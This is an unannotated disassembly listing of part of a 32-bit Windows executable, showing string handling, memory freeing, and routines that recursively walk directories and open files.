  402ee2:	83 d1 00             	adc    $0x0,%ecx
  402ee5:	89 4a 0c             	mov    %ecx,0xc(%edx)
  402ee8:	8b 46 14             	mov    0x14(%esi),%eax
  402eeb:	8b 4e 18             	mov    0x18(%esi),%ecx
  402eee:	89 02                	mov    %eax,(%edx)
  402ef0:	89 4a 04             	mov    %ecx,0x4(%edx)
  402ef3:	c7 42 1c 2e 00 00 00 	movl   $0x2e,0x1c(%edx)
  402efa:	8d 4e 2c             	lea    0x2c(%esi),%ecx
  402efd:	8d 7a 20             	lea    0x20(%edx),%edi
  402f00:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  402f03:	8d 51 02             	lea    0x2(%ecx),%edx
  402f06:	66 8b 01             	mov    (%ecx),%ax
  402f09:	83 c1 02             	add    $0x2,%ecx
  402f0c:	66 85 c0             	test   %ax,%ax
  402f0f:	75 f5                	jne    0x402f06
  402f11:	2b ca                	sub    %edx,%ecx
  402f13:	88 45 ec             	mov    %al,-0x14(%ebp)
  402f16:	ff 75 ec             	push   -0x14(%ebp)
  402f19:	d1 f9                	sar    $1,%ecx
  402f1b:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  402f1e:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  402f21:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  402f24:	e8 47 30 00 00       	call   0x405f70
  402f29:	83 c4 04             	add    $0x4,%esp
  402f2c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402f33:	8b df                	mov    %edi,%ebx
  402f35:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  402f39:	72 02                	jb     0x402f3d
  402f3b:	8b 1f                	mov    (%edi),%ebx
  402f3d:	8b 77 10             	mov    0x10(%edi),%esi
  402f40:	8b cb                	mov    %ebx,%ecx
  402f42:	8d 14 73             	lea    (%ebx,%esi,2),%edx
  402f45:	e8 46 eb ff ff       	call   0x401a90
  402f4a:	2b c3                	sub    %ebx,%eax
  402f4c:	d1 f8                	sar    $1,%eax
  402f4e:	3b f0                	cmp    %eax,%esi
  402f50:	72 71                	jb     0x402fc3
  402f52:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  402f56:	8b cf                	mov    %edi,%ecx
  402f58:	72 02                	jb     0x402f5c
  402f5a:	8b 0f                	mov    (%edi),%ecx
  402f5c:	33 d2                	xor    %edx,%edx
  402f5e:	89 47 10             	mov    %eax,0x10(%edi)
  402f61:	66 89 14 41          	mov    %dx,(%ecx,%eax,2)
  402f65:	8d 45 cc             	lea    -0x34(%ebp),%eax
  402f68:	50                   	push   %eax
  402f69:	8b cf                	mov    %edi,%ecx
  402f6b:	88 55 fc             	mov    %dl,-0x4(%ebp)
  402f6e:	e8 1d ec ff ff       	call   0x401b90
  402f73:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402f76:	83 f9 08             	cmp    $0x8,%ecx
  402f79:	72 34                	jb     0x402faf
  402f7b:	8b 55 cc             	mov    -0x34(%ebp),%edx
  402f7e:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  402f85:	8b c2                	mov    %edx,%eax
  402f87:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402f8d:	72 16                	jb     0x402fa5
  402f8f:	8b 50 fc             	mov    -0x4(%eax),%edx
  402f92:	83 c1 23             	add    $0x23,%ecx
  402f95:	2b c2                	sub    %edx,%eax
  402f97:	83 c0 fc             	add    $0xfffffffc,%eax
  402f9a:	83 f8 1f             	cmp    $0x1f,%eax
  402f9d:	76 06                	jbe    0x402fa5
  402f9f:	ff 15 80 91 40 00    	call   *0x409180
  402fa5:	51                   	push   %ecx
  402fa6:	52                   	push   %edx
  402fa7:	e8 10 3b 00 00       	call   0x406abc
  402fac:	83 c4 08             	add    $0x8,%esp
  402faf:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402fb2:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402fb9:	59                   	pop    %ecx
  402fba:	5f                   	pop    %edi
  402fbb:	5e                   	pop    %esi
  402fbc:	5b                   	pop    %ebx
  402fbd:	8b e5                	mov    %ebp,%esp
  402fbf:	5d                   	pop    %ebp
  402fc0:	c2 04 00             	ret    $0x4
  402fc3:	e8 c8 19 00 00       	call   0x404990
  402fc8:	cc                   	int3
  402fc9:	cc                   	int3
  402fca:	cc                   	int3
  402fcb:	cc                   	int3
  402fcc:	cc                   	int3
  402fcd:	cc                   	int3
  402fce:	cc                   	int3
  402fcf:	cc                   	int3
  402fd0:	55                   	push   %ebp
  402fd1:	8b ec                	mov    %esp,%ebp
  402fd3:	6a ff                	push   $0xffffffff
  402fd5:	68 f8 7c 40 00       	push   $0x407cf8
  402fda:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402fe0:	50                   	push   %eax
  402fe1:	83 ec 0c             	sub    $0xc,%esp
  402fe4:	56                   	push   %esi
  402fe5:	57                   	push   %edi
  402fe6:	a1 04 c0 40 00       	mov    0x40c004,%eax
  402feb:	33 c5                	xor    %ebp,%eax
  402fed:	50                   	push   %eax
  402fee:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402ff1:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402ff7:	8b d1                	mov    %ecx,%edx
  402ff9:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402ffc:	89 55 ec             	mov    %edx,-0x14(%ebp)
  402fff:	8b 7d 08             	mov    0x8(%ebp),%edi
  403002:	8d 72 20             	lea    0x20(%edx),%esi
  403005:	89 55 e8             	mov    %edx,-0x18(%ebp)
  403008:	0f 57 c0             	xorps  %xmm0,%xmm0
  40300b:	0f 11 02             	movups %xmm0,(%edx)
  40300e:	0f 11 42 10          	movups %xmm0,0x10(%edx)
  403012:	0f 11 06             	movups %xmm0,(%esi)
  403015:	66 0f d6 46 10       	movq   %xmm0,0x10(%esi)
  40301a:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  403020:	33 c0                	xor    %eax,%eax
  403022:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  403029:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  403030:	66 89 06             	mov    %ax,(%esi)
  403033:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40303a:	8b 47 18             	mov    0x18(%edi),%eax
  40303d:	c7 47 18 ff ff ff ff 	movl   $0xffffffff,0x18(%edi)
  403044:	89 42 38             	mov    %eax,0x38(%edx)
  403047:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  40304b:	3b f7                	cmp    %edi,%esi
  40304d:	74 68                	je     0x4030b7
  40304f:	8b 4e 14             	mov    0x14(%esi),%ecx
  403052:	83 f9 08             	cmp    $0x8,%ecx
  403055:	72 30                	jb     0x403087
  403057:	8b 06                	mov    (%esi),%eax
  403059:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  403060:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  403066:	72 12                	jb     0x40307a
  403068:	8b 50 fc             	mov    -0x4(%eax),%edx
  40306b:	83 c1 23             	add    $0x23,%ecx
  40306e:	2b c2                	sub    %edx,%eax
  403070:	83 c0 fc             	add    $0xfffffffc,%eax
  403073:	83 f8 1f             	cmp    $0x1f,%eax
  403076:	77 60                	ja     0x4030d8
  403078:	8b c2                	mov    %edx,%eax
  40307a:	51                   	push   %ecx
  40307b:	50                   	push   %eax
  40307c:	e8 3b 3a 00 00       	call   0x406abc
  403081:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403084:	83 c4 08             	add    $0x8,%esp
  403087:	33 c0                	xor    %eax,%eax
  403089:	66 89 06             	mov    %ax,(%esi)
  40308c:	89 46 10             	mov    %eax,0x10(%esi)
  40308f:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  403096:	0f 10 07             	movups (%edi),%xmm0
  403099:	0f 11 06             	movups %xmm0,(%esi)
  40309c:	f3 0f 7e 47 10       	movq   0x10(%edi),%xmm0
  4030a1:	66 0f d6 46 10       	movq   %xmm0,0x10(%esi)
  4030a6:	89 47 10             	mov    %eax,0x10(%edi)
  4030a9:	c7 47 14 07 00 00 00 	movl   $0x7,0x14(%edi)
  4030b0:	66 89 07             	mov    %ax,(%edi)
  4030b3:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  4030b7:	8d 4f 1c             	lea    0x1c(%edi),%ecx
  4030ba:	51                   	push   %ecx
  4030bb:	8b ca                	mov    %edx,%ecx
  4030bd:	e8 ce fd ff ff       	call   0x402e90
  4030c2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4030c5:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4030c8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4030cf:	59                   	pop    %ecx
  4030d0:	5f                   	pop    %edi
  4030d1:	5e                   	pop    %esi
  4030d2:	8b e5                	mov    %ebp,%esp
  4030d4:	5d                   	pop    %ebp
  4030d5:	c2 08 00             	ret    $0x8
  4030d8:	ff 15 80 91 40 00    	call   *0x409180
  4030de:	cc                   	int3
  4030df:	cc                   	int3
  4030e0:	56                   	push   %esi
  4030e1:	8b f1                	mov    %ecx,%esi
  4030e3:	8b 4e 34             	mov    0x34(%esi),%ecx
  4030e6:	83 f9 08             	cmp    $0x8,%ecx
  4030e9:	72 2e                	jb     0x403119
  4030eb:	8b 46 20             	mov    0x20(%esi),%eax
  4030ee:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  4030f5:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4030fb:	72 12                	jb     0x40310f
  4030fd:	8b 50 fc             	mov    -0x4(%eax),%edx
  403100:	83 c1 23             	add    $0x23,%ecx
  403103:	2b c2                	sub    %edx,%eax
  403105:	83 c0 fc             	add    $0xfffffffc,%eax
  403108:	83 f8 1f             	cmp    $0x1f,%eax
  40310b:	77 22                	ja     0x40312f
  40310d:	8b c2                	mov    %edx,%eax
  40310f:	51                   	push   %ecx
  403110:	50                   	push   %eax
  403111:	e8 a6 39 00 00       	call   0x406abc
  403116:	83 c4 08             	add    $0x8,%esp
  403119:	33 c0                	xor    %eax,%eax
  40311b:	c7 46 30 00 00 00 00 	movl   $0x0,0x30(%esi)
  403122:	c7 46 34 07 00 00 00 	movl   $0x7,0x34(%esi)
  403129:	66 89 46 20          	mov    %ax,0x20(%esi)
  40312d:	5e                   	pop    %esi
  40312e:	c3                   	ret
  40312f:	ff 15 80 91 40 00    	call   *0x409180
  403135:	cc                   	int3
  403136:	cc                   	int3
  403137:	cc                   	int3
  403138:	cc                   	int3
  403139:	cc                   	int3
  40313a:	cc                   	int3
  40313b:	cc                   	int3
  40313c:	cc                   	int3
  40313d:	cc                   	int3
  40313e:	cc                   	int3
  40313f:	cc                   	int3
  403140:	55                   	push   %ebp
  403141:	8b ec                	mov    %esp,%ebp
  403143:	83 e4 f8             	and    $0xfffffff8,%esp
  403146:	81 ec 5c 02 00 00    	sub    $0x25c,%esp
  40314c:	a1 04 c0 40 00       	mov    0x40c004,%eax
  403151:	33 c4                	xor    %esp,%eax
  403153:	89 84 24 58 02 00 00 	mov    %eax,0x258(%esp)
  40315a:	53                   	push   %ebx
  40315b:	56                   	push   %esi
  40315c:	57                   	push   %edi
  40315d:	8b f9                	mov    %ecx,%edi
  40315f:	8b 37                	mov    (%edi),%esi
  403161:	8d 44 24 10          	lea    0x10(%esp),%eax
  403165:	50                   	push   %eax
  403166:	ff 76 38             	push   0x38(%esi)
  403169:	e8 bd 35 00 00       	call   0x40672b
  40316e:	83 f8 12             	cmp    $0x12,%eax
  403171:	74 4b                	je     0x4031be
  403173:	85 c0                	test   %eax,%eax
  403175:	0f 85 8f 00 00 00    	jne    0x40320a
  40317b:	66 83 7c 24 3c 2e    	cmpw   $0x2e,0x3c(%esp)
  403181:	75 18                	jne    0x40319b
  403183:	66 8b 44 24 3e       	mov    0x3e(%esp),%ax
  403188:	66 85 c0             	test   %ax,%ax
  40318b:	74 d4                	je     0x403161
  40318d:	66 83 f8 2e          	cmp    $0x2e,%ax
  403191:	75 08                	jne    0x40319b
  403193:	66 83 7c 24 40 00    	cmpw   $0x0,0x40(%esp)
  403199:	74 c6                	je     0x403161
  40319b:	8d 44 24 10          	lea    0x10(%esp),%eax
  40319f:	8b ce                	mov    %esi,%ecx
  4031a1:	50                   	push   %eax
  4031a2:	e8 e9 fc ff ff       	call   0x402e90
  4031a7:	8b c7                	mov    %edi,%eax
  4031a9:	5f                   	pop    %edi
  4031aa:	5e                   	pop    %esi
  4031ab:	5b                   	pop    %ebx
  4031ac:	8b 8c 24 58 02 00 00 	mov    0x258(%esp),%ecx
  4031b3:	33 cc                	xor    %esp,%ecx
  4031b5:	e8 bf 38 00 00       	call   0x406a79
  4031ba:	8b e5                	mov    %ebp,%esp
  4031bc:	5d                   	pop    %ebp
  4031bd:	c3                   	ret
  4031be:	8b 77 04             	mov    0x4(%edi),%esi
  4031c1:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  4031c7:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  4031ce:	85 f6                	test   %esi,%esi
  4031d0:	74 21                	je     0x4031f3
  4031d2:	83 cb ff             	or     $0xffffffff,%ebx
  4031d5:	8b c3                	mov    %ebx,%eax
  4031d7:	f0 0f c1 46 04       	lock xadd %eax,0x4(%esi)
  4031dc:	75 15                	jne    0x4031f3
  4031de:	8b 06                	mov    (%esi),%eax
  4031e0:	8b ce                	mov    %esi,%ecx
  4031e2:	ff 10                	call   *(%eax)
  4031e4:	f0 0f c1 5e 08       	lock xadd %ebx,0x8(%esi)
  4031e9:	4b                   	dec    %ebx
  4031ea:	75 07                	jne    0x4031f3
  4031ec:	8b 16                	mov    (%esi),%edx
  4031ee:	8b ce                	mov    %esi,%ecx
  4031f0:	ff 52 04             	call   *0x4(%edx)
  4031f3:	8b 8c 24 64 02 00 00 	mov    0x264(%esp),%ecx
  4031fa:	8b c7                	mov    %edi,%eax
  4031fc:	5f                   	pop    %edi
  4031fd:	5e                   	pop    %esi
  4031fe:	5b                   	pop    %ebx
  4031ff:	33 cc                	xor    %esp,%ecx
  403201:	e8 73 38 00 00       	call   0x406a79
  403206:	8b e5                	mov    %ebp,%esp
  403208:	5d                   	pop    %ebp
  403209:	c3                   	ret
  40320a:	8b d0                	mov    %eax,%edx
  40320c:	e8 df f6 ff ff       	call   0x4028f0
  403211:	cc                   	int3
  403212:	cc                   	int3
  403213:	cc                   	int3
  403214:	cc                   	int3
  403215:	cc                   	int3
  403216:	cc                   	int3
  403217:	cc                   	int3
  403218:	cc                   	int3
  403219:	cc                   	int3
  40321a:	cc                   	int3
  40321b:	cc                   	int3
  40321c:	cc                   	int3
  40321d:	cc                   	int3
  40321e:	cc                   	int3
  40321f:	cc                   	int3
  403220:	56                   	push   %esi
  403221:	8b 71 04             	mov    0x4(%ecx),%esi
  403224:	85 f6                	test   %esi,%esi
  403226:	74 25                	je     0x40324d
  403228:	57                   	push   %edi
  403229:	83 cf ff             	or     $0xffffffff,%edi
  40322c:	8b c7                	mov    %edi,%eax
  40322e:	f0 0f c1 46 04       	lock xadd %eax,0x4(%esi)
  403233:	75 17                	jne    0x40324c
  403235:	8b 06                	mov    (%esi),%eax
  403237:	8b ce                	mov    %esi,%ecx
  403239:	ff 10                	call   *(%eax)
  40323b:	f0 0f c1 7e 08       	lock xadd %edi,0x8(%esi)
  403240:	4f                   	dec    %edi
  403241:	75 09                	jne    0x40324c
  403243:	8b 06                	mov    (%esi),%eax
  403245:	8b ce                	mov    %esi,%ecx
  403247:	5f                   	pop    %edi
  403248:	5e                   	pop    %esi
  403249:	ff 60 04             	jmp    *0x4(%eax)
  40324c:	5f                   	pop    %edi
  40324d:	5e                   	pop    %esi
  40324e:	c3                   	ret
  40324f:	cc                   	int3
  403250:	55                   	push   %ebp
  403251:	8b ec                	mov    %esp,%ebp
  403253:	83 e4 f8             	and    $0xfffffff8,%esp
  403256:	83 ec 44             	sub    $0x44,%esp
  403259:	a1 04 c0 40 00       	mov    0x40c004,%eax
  40325e:	33 c4                	xor    %esp,%eax
  403260:	89 44 24 40          	mov    %eax,0x40(%esp)
  403264:	56                   	push   %esi
  403265:	8b f1                	mov    %ecx,%esi
  403267:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40326e:	00 
  40326f:	c7 44 24 0c ff ff 00 	movl   $0xffff,0xc(%esp)
  403276:	00 
  403277:	8b c6                	mov    %esi,%eax
  403279:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  40327d:	72 02                	jb     0x403281
  40327f:	8b 06                	mov    (%esi),%eax
  403281:	6a ff                	push   $0xffffffff
  403283:	6a 03                	push   $0x3
  403285:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  403289:	51                   	push   %ecx
  40328a:	50                   	push   %eax
  40328b:	e8 3c 35 00 00       	call   0x4067cc
  403290:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  403294:	89 44 24 10          	mov    %eax,0x10(%esp)
  403298:	51                   	push   %ecx
  403299:	50                   	push   %eax
  40329a:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40329e:	e8 9d f8 ff ff       	call   0x402b40
  4032a3:	8b 44 24 08          	mov    0x8(%esp),%eax
  4032a7:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4032ab:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4032af:	c7 44 24 1c 20 c0 40 	movl   $0x40c020,0x1c(%esp)
  4032b6:	00 
  4032b7:	85 c0                	test   %eax,%eax
  4032b9:	74 16                	je     0x4032d1
  4032bb:	83 f8 01             	cmp    $0x1,%eax
  4032be:	0f 95 c0             	setne  %al
  4032c1:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  4032c5:	5e                   	pop    %esi
  4032c6:	33 cc                	xor    %esp,%ecx
  4032c8:	e8 ac 37 00 00       	call   0x406a79
  4032cd:	8b e5                	mov    %ebp,%esp
  4032cf:	5d                   	pop    %ebp
  4032d0:	c3                   	ret
  4032d1:	32 c0                	xor    %al,%al
  4032d3:	85 c9                	test   %ecx,%ecx
  4032d5:	74 ea                	je     0x4032c1
  4032d7:	56                   	push   %esi
  4032d8:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  4032dc:	e8 df f7 ff ff       	call   0x402ac0
  4032e1:	cc                   	int3
  4032e2:	cc                   	int3
  4032e3:	cc                   	int3
  4032e4:	cc                   	int3
  4032e5:	cc                   	int3
  4032e6:	cc                   	int3
  4032e7:	cc                   	int3
  4032e8:	cc                   	int3
  4032e9:	cc                   	int3
  4032ea:	cc                   	int3
  4032eb:	cc                   	int3
  4032ec:	cc                   	int3
  4032ed:	cc                   	int3
  4032ee:	cc                   	int3
  4032ef:	cc                   	int3
  4032f0:	55                   	push   %ebp
  4032f1:	8b ec                	mov    %esp,%ebp
  4032f3:	6a ff                	push   $0xffffffff
  4032f5:	68 5f 7d 40 00       	push   $0x407d5f
  4032fa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403300:	50                   	push   %eax
  403301:	83 ec 60             	sub    $0x60,%esp
  403304:	a1 04 c0 40 00       	mov    0x40c004,%eax
  403309:	33 c5                	xor    %ebp,%eax
  40330b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40330e:	56                   	push   %esi
  40330f:	57                   	push   %edi
  403310:	50                   	push   %eax
  403311:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403314:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40331a:	8b f1                	mov    %ecx,%esi
  40331c:	33 ff                	xor    %edi,%edi
  40331e:	89 7d c0             	mov    %edi,-0x40(%ebp)
  403321:	e8 2a ff ff ff       	call   0x403250
  403326:	84 c0                	test   %al,%al
  403328:	75 08                	jne    0x403332
  40332a:	83 c8 ff             	or     $0xffffffff,%eax
  40332d:	e9 ce 03 00 00       	jmp    0x403700
  403332:	0f 57 c0             	xorps  %xmm0,%xmm0
  403335:	66 0f 13 45 c8       	movlpd %xmm0,-0x38(%ebp)
  40333a:	89 7d c8             	mov    %edi,-0x38(%ebp)
  40333d:	89 7d cc             	mov    %edi,-0x34(%ebp)
  403340:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403347:	66 0f 13 45 d0       	movlpd %xmm0,-0x30(%ebp)
  40334c:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  403353:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  40335a:	51                   	push   %ecx
  40335b:	8b d6                	mov    %esi,%edx
  40335d:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  403361:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  403364:	e8 b7 17 00 00       	call   0x404b20
  403369:	83 c4 04             	add    $0x4,%esp
  40336c:	85 c0                	test   %eax,%eax
  40336e:	0f 85 ad 03 00 00    	jne    0x403721
  403374:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  403378:	8b 75 d0             	mov    -0x30(%ebp),%esi
  40337b:	85 f6                	test   %esi,%esi
  40337d:	0f 84 53 03 00 00    	je     0x4036d6
  403383:	8b ce                	mov    %esi,%ecx
  403385:	e8 d6 f8 ff ff       	call   0x402c60
  40338a:	84 c0                	test   %al,%al
  40338c:	74 12                	je     0x4033a0
  40338e:	8d 4e 20             	lea    0x20(%esi),%ecx
  403391:	e8 5a ff ff ff       	call   0x4032f0
  403396:	03 f8                	add    %eax,%edi
  403398:	89 7d c0             	mov    %edi,-0x40(%ebp)
  40339b:	e9 23 03 00 00       	jmp    0x4036c3
  4033a0:	c6 45 a0 00          	movb   $0x0,-0x60(%ebp)
  4033a4:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4033a7:	ff 75 a0             	push   -0x60(%ebp)
  4033aa:	e8 51 2c 00 00       	call   0x406000
  4033af:	83 c4 04             	add    $0x4,%esp
  4033b2:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  4033b5:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  4033b9:	8d 7e 20             	lea    0x20(%esi),%edi
  4033bc:	50                   	push   %eax
  4033bd:	8b cf                	mov    %edi,%ecx
  4033bf:	e8 7c eb ff ff       	call   0x401f40
  4033c4:	83 7d ec 08          	cmpl   $0x8,-0x14(%ebp)
  4033c8:	8b c8                	mov    %eax,%ecx
  4033ca:	ff 75 e8             	push   -0x18(%ebp)
  4033cd:	8b 75 d8             	mov    -0x28(%ebp),%esi
  4033d0:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4033d3:	0f 43 c6             	cmovae %esi,%eax
  4033d6:	50                   	push   %eax
  4033d7:	e8 e4 e9 ff ff       	call   0x401dc0
  4033dc:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  4033df:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4033e2:	83 f9 08             	cmp    $0x8,%ecx
  4033e5:	72 35                	jb     0x40341c
  4033e7:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  4033ea:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  4033f1:	8b c2                	mov    %edx,%eax
  4033f3:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4033f9:	72 14                	jb     0x40340f
  4033fb:	8b 50 fc             	mov    -0x4(%eax),%edx
  4033fe:	83 c1 23             	add    $0x23,%ecx
  403401:	2b c2                	sub    %edx,%eax
  403403:	83 c0 fc             	add    $0xfffffffc,%eax
  403406:	83 f8 1f             	cmp    $0x1f,%eax
  403409:	0f 87 0c 03 00 00    	ja     0x40371b
  40340f:	51                   	push   %ecx
  403410:	52                   	push   %edx
  403411:	e8 a6 36 00 00       	call   0x406abc
  403416:	8b 75 d8             	mov    -0x28(%ebp),%esi
  403419:	83 c4 08             	add    $0x8,%esp
  40341c:	33 c0                	xor    %eax,%eax
  40341e:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  403422:	66 89 45 a4          	mov    %ax,-0x5c(%ebp)
  403426:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403429:	c7 45 b4 00 00 00 00 	movl   $0x0,-0x4c(%ebp)
  403430:	c7 45 b8 07 00 00 00 	movl   $0x7,-0x48(%ebp)
  403437:	83 f8 08             	cmp    $0x8,%eax
  40343a:	72 2f                	jb     0x40346b
  40343c:	8d 0c 45 02 00 00 00 	lea    0x2(,%eax,2),%ecx
  403443:	8b c6                	mov    %esi,%eax
  403445:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40344b:	72 14                	jb     0x403461
  40344d:	8b 70 fc             	mov    -0x4(%eax),%esi
  403450:	83 c1 23             	add    $0x23,%ecx
  403453:	2b c6                	sub    %esi,%eax
  403455:	83 c0 fc             	add    $0xfffffffc,%eax
  403458:	83 f8 1f             	cmp    $0x1f,%eax
  40345b:	0f 87 ba 02 00 00    	ja     0x40371b
  403461:	51                   	push   %ecx
  403462:	56                   	push   %esi
  403463:	e8 54 36 00 00       	call   0x406abc
  403468:	83 c4 08             	add    $0x8,%esp
  40346b:	83 7d c4 00          	cmpl   $0x0,-0x3c(%ebp)
  40346f:	0f 85 4b 02 00 00    	jne    0x4036c0
  403475:	8b 0d 00 91 40 00    	mov    0x409100,%ecx
  40347b:	0f 57 c0             	xorps  %xmm0,%xmm0
  40347e:	ba 78 94 40 00       	mov    $0x409478,%edx
  403483:	0f 11 45 e0          	movups %xmm0,-0x20(%ebp)
  403487:	e8 24 18 00 00       	call   0x404cb0
  40348c:	8b f0                	mov    %eax,%esi
  40348e:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  403491:	51                   	push   %ecx
  403492:	50                   	push   %eax
  403493:	8b cf                	mov    %edi,%ecx
  403495:	e8 06 15 00 00       	call   0x4049a0
  40349a:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  40349e:	83 78 14 10          	cmpl   $0x10,0x14(%eax)
  4034a2:	8b 48 10             	mov    0x10(%eax),%ecx
  4034a5:	72 02                	jb     0x4034a9
  4034a7:	8b 00                	mov    (%eax),%eax
  4034a9:	89 4d 98             	mov    %ecx,-0x68(%ebp)
  4034ac:	8d 55 94             	lea    -0x6c(%ebp),%edx
  4034af:	8b ce                	mov    %esi,%ecx
  4034b1:	89 45 94             	mov    %eax,-0x6c(%ebp)
  4034b4:	66 c7 45 9c 22 5c    	movw   $0x5c22,-0x64(%ebp)
  4034ba:	e8 71 2b 00 00       	call   0x406030
  4034bf:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  4034c3:	8b f0                	mov    %eax,%esi
  4034c5:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  4034c8:	83 f9 10             	cmp    $0x10,%ecx
  4034cb:	72 2c                	jb     0x4034f9
  4034cd:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  4034d0:	41                   	inc    %ecx
  4034d1:	8b c2                	mov    %edx,%eax
  4034d3:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4034d9:	72 14                	jb     0x4034ef
  4034db:	8b 50 fc             	mov    -0x4(%eax),%edx
  4034de:	83 c1 23             	add    $0x23,%ecx
  4034e1:	2b c2                	sub    %edx,%eax
  4034e3:	83 c0 fc             	add    $0xfffffffc,%eax
  4034e6:	83 f8 1f             	cmp    $0x1f,%eax
  4034e9:	0f 87 2c 02 00 00    	ja     0x40371b
  4034ef:	51                   	push   %ecx
  4034f0:	52                   	push   %edx
  4034f1:	e8 c6 35 00 00       	call   0x406abc
  4034f6:	83 c4 08             	add    $0x8,%esp
  4034f9:	ba 74 94 40 00       	mov    $0x409474,%edx
  4034fe:	c7 45 b4 00 00 00 00 	movl   $0x0,-0x4c(%ebp)
  403505:	8b ce                	mov    %esi,%ecx
  403507:	c7 45 b8 0f 00 00 00 	movl   $0xf,-0x48(%ebp)
  40350e:	c6 45 a4 00          	movb   $0x0,-0x5c(%ebp)
  403512:	e8 99 17 00 00       	call   0x404cb0
  403517:	68 c0 00 00 00       	push   $0xc0
  40351c:	e8 66 35 00 00       	call   0x406a87
  403521:	8b f0                	mov    %eax,%esi
  403523:	89 75 bc             	mov    %esi,-0x44(%ebp)
  403526:	68 c0 00 00 00       	push   $0xc0
  40352b:	6a 00                	push   $0x0
  40352d:	56                   	push   %esi
  40352e:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  403532:	e8 6b 41 00 00       	call   0x4076a2
  403537:	83 c4 10             	add    $0x10,%esp
  40353a:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  40353e:	72 02                	jb     0x403542
  403540:	8b 3f                	mov    (%edi),%edi
  403542:	83 ec 0c             	sub    $0xc,%esp
  403545:	8b ce                	mov    %esi,%ecx
  403547:	57                   	push   %edi
  403548:	e8 d3 26 00 00       	call   0x405c20
  40354d:	8b 06                	mov    (%esi),%eax
  40354f:	6a 00                	push   $0x0
  403551:	6a 00                	push   $0x0
  403553:	6a 00                	push   $0x0
  403555:	8b 40 04             	mov    0x4(%eax),%eax
  403558:	c7 04 06 b8 95 40 00 	movl   $0x4095b8,(%esi,%eax,1)
  40355f:	8b 06                	mov    (%esi),%eax
  403561:	8b 48 04             	mov    0x4(%eax),%ecx
  403564:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  403568:	8d 41 88             	lea    -0x78(%ecx),%eax
  40356b:	89 44 31 fc          	mov    %eax,-0x4(%ecx,%esi,1)
  40356f:	8b ce                	mov    %esi,%ecx
  403571:	ff 15 8c 90 40 00    	call   *0x40908c
  403577:	6a 00                	push   $0x0
  403579:	6a 10                	push   $0x10
  40357b:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40357e:	8b ce                	mov    %esi,%ecx
  403580:	50                   	push   %eax
  403581:	ff 15 88 90 40 00    	call   *0x409088
